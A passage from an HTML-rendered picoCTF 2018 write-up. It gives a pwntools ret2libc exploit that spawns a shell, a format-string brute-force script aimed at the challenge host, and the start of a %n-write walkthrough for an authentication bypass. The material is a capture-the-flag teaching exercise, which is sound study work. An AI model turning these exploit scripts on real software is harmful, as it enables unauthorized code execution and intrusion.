</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">72
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">73
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">74
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">75
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">76
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">77
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">78
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">79
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">80
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">81
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">82
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">83
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">84
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">85
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">86
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">87
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/bin/usr/env python</span>
<span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> ELF, ssh, p32, cyclic, cyclic_find, ROP, fit, log
<span style="color:#ff79c6">import</span> re
<span style="color:#ff79c6">import</span> os

DEV<span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span>

SSH_SERVER <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;2018shell4.picoctf.com&#34;</span>
LOCAL_PATH <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;.&#39;</span>
REMOTE_PATH <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;/problems/got-2-learn-libc_0_4c2b153da9980f0b2d12a128ff19dc3f&#39;</span>
ssh_user<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;0xade1&#39;</span>

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">get_process_local</span>():
    elf <span style="color:#ff79c6">=</span> ELF(LOCAL_PATH <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/vuln&#39;</span>)
    p <span style="color:#ff79c6">=</span> elf<span style="color:#ff79c6">.</span>process()
    libc <span style="color:#ff79c6">=</span> ELF(<span style="color:#f1fa8c">&#34;/lib/i386-linux-gnu/libc.so.6&#34;</span>)
    <span style="color:#ff79c6">return</span> p, libc

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">get_process_remote</span>():
    path <span style="color:#ff79c6">=</span> REMOTE_PATH <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/vuln&#39;</span>
    params <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#34;argv&#34;</span>: path, <span style="color:#f1fa8c">&#34;cwd&#34;</span>: os<span style="color:#ff79c6">.</span>path<span style="color:#ff79c6">.</span>dirname(path)}
    s <span style="color:#ff79c6">=</span> ssh(host<span style="color:#ff79c6">=</span>SSH_SERVER, user<span style="color:#ff79c6">=</span>ssh_user)
    p <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>process(<span style="color:#ff79c6">**</span>params)
    libc <span style="color:#ff79c6">=</span> ELF(<span style="color:#f1fa8c">&#34;./libc-2.23.so&#34;</span>)
    <span style="color:#ff79c6">return</span> p, libc

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">get_overflow_offset</span>():
    <span style="color:#6272a4"># When filesystem is NTFS, it&#39;s problematic to create a core dump,</span>
    <span style="color:#6272a4"># Therefore we have to reconfigure core dumps to be created elsewhere</span>
    <span style="color:#6272a4">#os.system(&#34;echo /dev/shm/.core/core_dump &gt; /proc/sys/kernel/core_pattern&#34;)</span>
    <span style="color:#6272a4">#os.system(&#34;echo ~/core/core_dump &gt; /proc/sys/kernel/core_pattern&#34;)</span>
    proc, _ <span style="color:#ff79c6">=</span> get_process_local()
    payload <span style="color:#ff79c6">=</span> cyclic(<span style="color:#bd93f9">200</span>)
    proc<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#34;Enter a string:&#34;</span>, payload)
    proc<span style="color:#ff79c6">.</span>wait()
    core <span style="color:#ff79c6">=</span> proc<span style="color:#ff79c6">.</span>corefile
    offset <span style="color:#ff79c6">=</span> cyclic_find(core<span style="color:#ff79c6">.</span>eip)
    log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">&#34;Overflow offset: </span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(offset))
    <span style="color:#ff79c6">return</span> offset

<span style="color:#6272a4">#offset = 160</span>
offset <span style="color:#ff79c6">=</span> get_overflow_offset()

<span style="color:#ff79c6">if</span> (DEV):
    p, libc <span style="color:#ff79c6">=</span> get_process_local()
<span style="color:#ff79c6">else</span>:
    p, libc <span style="color:#ff79c6">=</span> get_process_remote()

prompt <span style="color:#ff79c6">=</span> p<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#34;Enter a string:&#34;</span>)
puts_addr <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(re<span style="color:#ff79c6">.</span>findall(<span style="color:#f1fa8c">&#39;puts: (.*)&#39;</span>, prompt<span style="color:#ff79c6">.</span>decode())[<span style="color:#bd93f9">0</span>],<span style="color:#bd93f9">16</span>)
bin_sh_addr <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(re<span style="color:#ff79c6">.</span>findall(<span style="color:#f1fa8c">&#39;useful_string: (.*)&#39;</span>, prompt<span style="color:#ff79c6">.</span>decode())[<span style="color:#bd93f9">0</span>],<span style="color:#bd93f9">16</span>)

<span style="color:#6272a4">#libc_base address</span>
libc_base <span style="color:#ff79c6">=</span> puts_addr <span style="color:#ff79c6">-</span> libc<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#34;puts&#34;</span>]

<span style="color:#6272a4">#Rebase libc</span>
libc<span style="color:#ff79c6">.</span>address <span style="color:#ff79c6">=</span> libc_base

<span style="color:#6272a4">#system runtime address</span>
system_addr <span style="color:#ff79c6">=</span> libc<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#34;system&#34;</span>]

log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">&#34;Address of /bin/sh: </span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(<span style="color:#8be9fd;font-style:italic">hex</span>(bin_sh_addr)))
log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">&#34;Address of puts: </span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(<span style="color:#8be9fd;font-style:italic">hex</span>(puts_addr)))
log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">&#34;Address of libc_base: </span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(<span style="color:#8be9fd;font-style:italic">hex</span>(libc_base)))
log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">&#34;Address of system: </span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(<span style="color:#8be9fd;font-style:italic">hex</span>(system_addr)))

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">payload</span>():
    payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;A&#39;</span><span style="color:#ff79c6">*</span>offset
    payload <span style="color:#ff79c6">+=</span> p32(system_addr)
    payload <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;JUNK&#39;</span>
    payload <span style="color:#ff79c6">+=</span> p32(bin_sh_addr)
    log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;Payload: </span><span style="color:#f1fa8c">{</span>payload<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
    <span style="color:#ff79c6">return</span> payload

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">payload2</span>():
    r <span style="color:#ff79c6">=</span> ROP(libc)
    r<span style="color:#ff79c6">.</span>system(bin_sh_addr)
    payload <span style="color:#ff79c6">=</span> fit({offset: <span style="color:#f1fa8c">&#34;&#34;</span>})
    payload <span style="color:#ff79c6">+=</span> r<span style="color:#ff79c6">.</span>chain()
    log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;Payload: </span><span style="color:#f1fa8c">{</span>payload<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
    log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">&#34;ROP dump:&#34;</span>)
    <span style="color:#8be9fd;font-style:italic">print</span> (r<span style="color:#ff79c6">.</span>dump())
    <span style="color:#ff79c6">return</span> payload

p<span style="color:#ff79c6">.</span>sendline(payload2())
p<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#39;cat flag.txt&#39;</span>)
p<span style="color:#ff79c6">.</span>interactive()
</code></pre></td></tr></table>
</div>
</div><h2 id="echooo">echooo</h2>
<p>The binary will execute any given <a href="https://owasp.org/www-community/attacks/Format_string_attack">format-string</a>.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">  <span style="color:#ff79c6">while</span>(<span style="color:#bd93f9">1</span>) {
    printf(<span style="color:#f1fa8c">&#34;&gt; &#34;</span>);
    fgets(buf, <span style="color:#ff79c6">sizeof</span>(buf), stdin);
    printf(buf); 			<span style="color:#6272a4">//Format-String vulnerability
</span><span style="color:#6272a4"></span>  }
</code></pre></td></tr></table>
</div>
</div><p>Therefore, we can bruteforce the memory and read it until we find the flag buffer</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/env python</span>

<span style="color:#ff79c6">import</span> pwn
pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>log_level <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;critical&#39;</span>

host, port <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;2018shell.picoctf.com&#39;</span>, <span style="color:#bd93f9">34802</span>

<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">100</span>):
  s <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>remote(host, port)
  prompt <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#39;&gt; &#39;</span>)
  s<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#39;%&#39;</span><span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">str</span>(i)<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#39;$s&#39;</span>)
  prompt <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>recv()
  <span style="color:#8be9fd;font-style:italic">print</span>(prompt)
  s<span style="color:#ff79c6">.</span>close()
  <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;pico&#39;</span> <span style="color:#ff79c6">in</span> prompt:
      <span style="color:#ff79c6">break</span>

</code></pre></td></tr></table>
</div>
</div><h2 id="authenticate">authenticate</h2>
<ul>
<li>source: <a href="./resources/authenticate/auth.c">auth.c</a></li>
<li>binary: <a href="./resources/authenticate/auth">auth</a></li>
</ul>
<p>Another <a href="https://owasp.org/www-community/attacks/Format_string_attack">format-string</a> when buf does not contains &lsquo;yes&rsquo; or &lsquo;no&rsquo;</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">  fgets(buf, <span style="color:#ff79c6">sizeof</span>(buf), stdin);

  <span style="color:#ff79c6">if</span> (strstr(buf, <span style="color:#f1fa8c">&#34;no&#34;</span>) <span style="color:#ff79c6">!=</span> <span style="color:#8be9fd;font-style:italic">NULL</span>) {
    printf(<span style="color:#f1fa8c">&#34;Okay, Exiting...</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
    exit(<span style="color:#bd93f9">1</span>);
  }
  <span style="color:#ff79c6">else</span> <span style="color:#ff79c6">if</span> (strstr(buf, <span style="color:#f1fa8c">&#34;yes&#34;</span>) <span style="color:#ff79c6">==</span> <span style="color:#8be9fd;font-style:italic">NULL</span>) {
    puts(<span style="color:#f1fa8c">&#34;Received Unknown Input:</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
    printf(buf);			<span style="color:#6272a4">/* format-string vulnerability */</span>
  }
</code></pre></td></tr></table>
</div>
</div><p>The flag will be printed if we can override the local variable &lsquo;authenticated&rsquo; to be &lt;&gt; 0</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">int</span> authenticated <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
[...]
<span style="color:#8be9fd">void</span> read_flag() {
  <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>authenticated) {
    printf(<span style="color:#f1fa8c">&#34;Sorry, you are not *authenticated*!</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
  }
  <span style="color:#ff79c6">else</span> {
    printf(<span style="color:#f1fa8c">&#34;Access Granted.</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
    flag();
  }
}
</code></pre></td></tr></table>
</div>
</div><p>It is possible to use a format-string to write any address at an arbitrary location.
A great resources to demonstrate is <a href="http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html">codearcana</a></p>
<p>Our exploitation path is the below:</p>
<ol>
<li>To achieve this, we find the address of the authenticated global (0x804a04c) with objdump or <code>pwn.symbols['authenticated']</code></li>
<li>We craft a format-string payload that contains the address 0x804a04c with a large sequence of &lsquo;%p&rsquo;</li>
<li>We pass this format-string as an argument to the vulnerable printf function, therefore our format string is in the stack frame of printf</li>
</ol>
<ul>
<li>The format-string is in the stackframe of printf and looks like: <code>payload = pwn.p32(elf.symbols['authenticated']) + '%p'*50</code></li>
<li>%p is an external representation of a pointer to void (in other words, it&rsquo;s a 32bits address)</li>
</ul>
<ol start="4">
<li>Executed, the format-string will dump the stackframe content &hellip;</li>
</ol>
<ul>
<li>Therefore we should find the relative position on the stackframe of the address 0x804a04c</li>
<li>We find the address is at position 11</li>
<li>Another representation to simplify the payload is: <code>payload = pwn.p32(elf.symbols['authenticated']) + '%11$p'</code></li>
</ul>
<ol start="5">
<li>We can now leverage another format-string to write a number at 0x804a04c (the address of the &lsquo;authenticated&rsquo; global)</li>
</ol>
<ul>
<li>Instead of %11$p  (print the 11th dword on the stack), we can use %n11$p</li>
<li>%11$n writes the number of printed characters at the address pointed 11 dwords further in the stack</li>
<li><code>payload = pwn.p32(elf.symbols['authenticated']) + '%11$n'</code> : indeed, &lsquo;n&rsquo; will write the number of char written by printf which is 4 because of pwn.p32(&hellip;) size.</li>
</ul>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
